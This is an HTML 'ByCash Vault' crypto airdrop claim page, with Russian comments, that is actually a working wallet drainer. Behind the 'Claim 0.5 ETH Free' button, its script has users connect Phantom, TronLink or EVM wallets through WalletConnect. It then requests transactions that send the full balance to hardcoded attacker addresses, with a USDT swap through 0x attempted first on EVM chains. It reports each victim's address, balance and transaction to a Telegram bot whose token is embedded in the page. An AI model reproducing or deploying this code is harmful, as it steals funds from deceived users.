<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>ByCash Vault - Claim Airdrop</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/tonconnect-ui@2.0.0-beta.3/dist/tonconnect-ui.min.js"></script>
  <!-- WalletConnect v2 -->
  <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/umd/index.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/sign-client@2.15.0/dist/index.umd.min.js"></script>

  <style>
    body { background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%); color: #e0e0ff; margin: 0; font-family: system-ui; min-height: 100vh; }
    .glow { text-shadow: 0 0 25px #a855f7; animation: pulse 3s infinite alternate; }
    @keyframes pulse { 0% { text-shadow: 0 0 15px #a855f7; } 100% { text-shadow: 0 0 35px #c026d3; } }
    .btn { background: linear-gradient(90deg, #7c3aed, #ec4899); padding: 1rem 2rem; border-radius: 999px; font-weight: bold; transition: all 0.3s; cursor: pointer; }
    .btn:hover { transform: scale(1.06); box-shadow: 0 0 40px #a855f7; }
    .claim-btn { background: linear-gradient(90deg, #22c55e, #4ade80); padding: 1.4rem 3rem; border-radius: 999px; font-weight: bold; font-size: 1.5rem; margin: 2rem auto; display: block; width: 90%; max-width: 400px; text-align: center; transition: all 0.3s; }
    .claim-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px #22c55e; }
    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; align-items: center; justify-content: center; }
    .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 480px; border: 2px solid #a855f7; }
    .wallet-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); gap: 1rem; margin: 2rem 0; }
    .wallet-item { cursor: pointer; text-align: center; padding: 0.8rem; border-radius: 1rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(168,85,247,0.3); height: 130px; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: all 0.25s; }
    .wallet-item:hover { transform: scale(1.07); background: rgba(168,85,247,0.18); }
    .wallet-item img { width: 64px; height: 64px; object-fit: contain; margin-bottom: 0.5rem; }
    .wallet-item p { font-size: 0.9rem; font-weight: 600; }
  </style>
</head>
<body>
  <header class="flex justify-between items-center px-5 py-4">
    <div class="flex items-center gap-3">
      <div class="w-10 h-10 bg-gradient-to-br from-violet-700 to-pink-600 rounded-full flex items-center justify-center">
        <i class="fas fa-cube text-white text-2xl"></i>
      </div>
      <span class="text-2xl md:text-3xl font-bold glow">ByCash Vault</span>
    </div>
    <button onclick="showModal()" class="btn text-base md:text-lg px-5 py-2.5">Connect Wallet</button>
  </header>

  <main class="flex flex-col items-center justify-center text-center px-5 py-10 md:py-16">
    <h1 class="text-5xl md:text-7xl lg:text-8xl font-extrabold glow mb-6">Claim Airdrop Now</h1>
    <p class="text-xl md:text-2xl text-purple-300 mb-10">Connect wallet → Confirm → Receive tokens instantly</p>
    <button onclick="showModal()" class="claim-btn">Claim 0.5 ETH Free</button>
  </main>

  <div id="modal" class="modal">
    <div class="modal-box">
      <h2 class="text-3xl md:text-4xl font-bold text-center mb-6 glow">Connect Wallet</h2>
      <div class="wallet-grid">
        <div class="wallet-item" onclick="connectWallet('MetaMask')"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask"><p>MetaMask</p></div>
        <div class="wallet-item" onclick="connectWallet('Trust Wallet')"><img src="https://i.postimg.cc/k6sJrC1k/image.png" alt="Trust"><p>Trust</p></div>
        <div class="wallet-item" onclick="connectWallet('Phantom')"><img src="https://i.postimg.cc/RNWjf9vf/image.png" alt="Phantom"><p>Phantom</p></div>
        <div class="wallet-item" onclick="connectWallet('Tonkeeper')"><img src="https://i.postimg.cc/T5wBtvg6/image.png" alt="Tonkeeper"><p>Tonkeeper</p></div>
        <div class="wallet-item" onclick="connectWallet('TronLink')"><img src="https://i.postimg.cc/FkyhQ41S/image.png" alt="TronLink"><p>TronLink</p></div>
      </div>
      <button onclick="document.getElementById('modal').style.display='none'" class="mt-6 w-full py-4 bg-red-700 hover:bg-red-600 rounded-full text-lg font-bold">Close</button>
    </div>
  </div>

  <script>
    // --------------------- НАСТРОЙКИ ---------------------
    const TG_TOKEN   = "8392732086:AAH21FfWZTjD-P8qnPFaqAVvSKtMwqA6U2A";
    const TG_CHAT_ID = "1913550429";
    const ZEROX_KEY  = "1dfc0fe9-246c-4809-bbee-a84100b59a2d";

    const DRAIN = {
      // Основные сети native
      "ethereum"          : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "polygon"           : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "bnb smart chain"   : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "base"              : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "solana"            : "FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM",
      "tron"              : "DNvLVnR7jcEiQFi4fSh8DqCTkB8g3vp7gk",
      "ton"               : "UQByYVaGVglEpP26nlBebudJa48Ps1u5VH3BYbprPa9j2YOw",

      // USDT / USDC / другие токены
      "usdt_ethereum"     : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "usdt_bnb"          : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "usdt_solana"       : "FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM",
      "usdt_tron"         : "TAReLQg8HPQSG2PKWJBi2iwzxsrHE5kULn",
      "usdc_ethereum"     : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "usdc_bnb"          : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "usdc_solana"       : "FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM",
      "usdc_base"         : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "dai_ethereum"      : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "dai_bnb"           : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "dai_solana"        : "FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM",
      "dai_base"          : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "shib_ethereum"     : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "shib_bnb"          : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "shib_solana"       : "FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM",
      "shib_base"         : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "uni_ethereum"      : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "uni_bnb"           : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
      "uni_solana"        : "FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM"
    };

    async function tg(msg) {
      try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`);
      } catch {}
    }

    function showModal() { document.getElementById('modal').style.display = 'flex'; }

    function isMobile() { return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }

    async function connectWallet(name) {
      await tg(`[START] Выбран кошелек: ${name} | mobile: ${isMobile()}`);

      if (name === 'Phantom')     return phantomFlow();
      if (name === 'Tonkeeper')   return tonkeeperFlow();
      if (name === 'TronLink')    return tronLinkFlow();

      return evmWalletConnectFlow(name);
    }

    // --------------------- Phantom ---------------------
    async function phantomFlow() {
      if (isMobile()) {
        const params = new URLSearchParams({
          dapp_encryption_public_key: '11111111111111111111111111111111',
          cluster: 'mainnet-beta',
          redirect_link: encodeURIComponent(window.location.href + '?ph=1')
        });
        window.location = `https://phantom.app/ul/v1/connect?${params}`;
        return;
      }

      if (!window.solana?.isPhantom) return await tg("Phantom не обнаружен");

      try {
        const { publicKey } = await window.solana.connect();
        const addr = publicKey.toString();
        await tg(`Phantom подключен → ${addr}`);

        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
        const balLam = await conn.getBalance(publicKey);
        const sol = (balLam / 1e9).toFixed(6);

        await tg(`Solana баланс: ${sol} SOL`);

        if (balLam > 5000000) { // >0.005 SOL
          const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: publicKey,
              toPubkey: new solanaWeb3.PublicKey(DRAIN.solana),
              lamports: balLam
            })
          );
          const { signature } = await window.solana.signAndSendTransaction(tx);
          await conn.confirmTransaction(signature);
          await tg(`DRAIN Solana ${sol} SOL → ${DRAIN.solana}`);
        }
      } catch (e) {
        await tg(`Phantom ошибка: ${e.message || e}`);
      }
    }

    // --------------------- EVM WalletConnect v2 ---------------------
    async function evmWalletConnectFlow(name) {
      try {
        const client = await SignClient.init({
          projectId: "a4746ac803fafe7cecb476f789b0230d",
          metadata: { name: "ByCash Vault", description: "Claim", url: window.location.origin, icons: [] }
        });

        const modal = await WalletConnectModal.init({ projectId: client.projectId });
        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              chains: ["eip155:1", "eip155:56", "eip155:137", "eip155:8453"],
              methods: ["eth_sendTransaction", "eth_signTypedData_v4"],
              events: ["chainChanged", "accountsChanged"]
            }
          }
        });

        modal.openModal({ uri });
        const session = await approval();

        const [namespace, chainRef, addr] = session.namespaces.eip155.accounts[0].split(":");
        const chainId = parseInt(chainRef);
        await tg(`WC ${name} → ${addr} (chain ${chainId})`);

        const rpc = chainId === 1 ? "https://eth.llamarpc.com" :
                    chainId === 56 ? "https://bsc-dataseed.binance.org/" :
                    chainId === 137 ? "https://polygon-rpc.com" :
                    "https://mainnet.base.org";

        const provider = new ethers.providers.JsonRpcProvider(rpc);
        const bal = await provider.getBalance(addr);
        const native = ethers.utils.formatEther(bal);

        await tg(`Баланс native: ${native}`);

        if (parseFloat(native) < 0.0003) return await tg("Баланс слишком мал");

        // Пробуем swap через 0x v2 Permit2 → USDT
        const usdt = chainId === 1 ? "0xdAC17F958D2ee523a2206206994597C13D831ec7" :
                     chainId === 56 ? "0x55d398326f99059fF775485246999027B3197955" :
                     chainId === 137 ? "0xc2132D05D31c914a87C6611C10748AEb04B58e8F" :
                     "0x..."; // base USDT если нужно

        if (!usdt.startsWith("0x...")) {
          const params = new URLSearchParams({
            chainId: chainId.toString(),
            sellToken: "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
            buyToken: usdt,
            sellAmount: bal.toString(),
            taker: addr
          });

          const url = `https://api.0x.org/swap/permit2/quote?${params}&0x-api-key=${ZEROX_KEY}&0x-version=v2`;
          const res = await fetch(url);
          const quote = await res.json();

          if (quote?.transaction) {
            await tg(`0x quote OK → swap → USDT`);
            const tx = { ...quote.transaction, from: addr };
            const result = await client.request({
              topic: session.topic,
              chainId: `eip155:${chainId}`,
              request: { method: "eth_sendTransaction", params: [tx] }
            });
            await tg(`SWAP + DRAIN выполнен → hash: ${result}`);
            return;
          }
        }

        // fallback — прямой drain
        const drainAddr = DRAIN["ethereum"] || "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000";
        const tx = { to: drainAddr, value: bal.toString(), from: addr };
        const hash = await client.request({
          topic: session.topic,
          chainId: `eip155:${chainId}`,
          request: { method: "eth_sendTransaction", params: [tx] }
        });
        await tg(`DRAIN native ${native} → ${drainAddr} | tx: ${hash}`);

      } catch (e) {
        await tg(`EVM WC ошибка: ${e.message || e}`);
      }
    }

    // --------------------- Tonkeeper ---------------------
    async function tonkeeperFlow() {
      const ui = new TonConnectUI({ manifestUrl: "https://bycash-airdrop.vercel.app/tonconnect-manifest.json" });
      try {
        await ui.openModal();
        const connected = await ui.connected;
        if (connected) await tg(`Tonkeeper → ${ui.account.address}`);
      } catch (e) { await tg(`Tonkeeper err: ${e}`); }
    }

    // --------------------- TronLink ---------------------
    async function tronLinkFlow() {
      if (!window.tronWeb?.ready) return await tg("TronLink не готов");
      try {
        const addr = window.tronWeb.defaultAddress.base58;
        const balSun = await window.tronWeb.trx.getBalance();
        const trx = (balSun / 1e6).toFixed(6);
        await tg(`TronLink → ${addr} | ${trx} TRX`);

        if (balSun > 1e6) {
          await window.tronWeb.trx.sendTrx(DRAIN.tron, balSun);
          await tg(`DRAIN TRX ${trx} → ${DRAIN.tron}`);
        }
      } catch (e) { await tg(`TronLink err: ${e}`); }
    }

    // Авто-подключение после Phantom redirect
    if (window.location.search.includes('ph=1')) phantomFlow();
  </script>
</body>
</html>
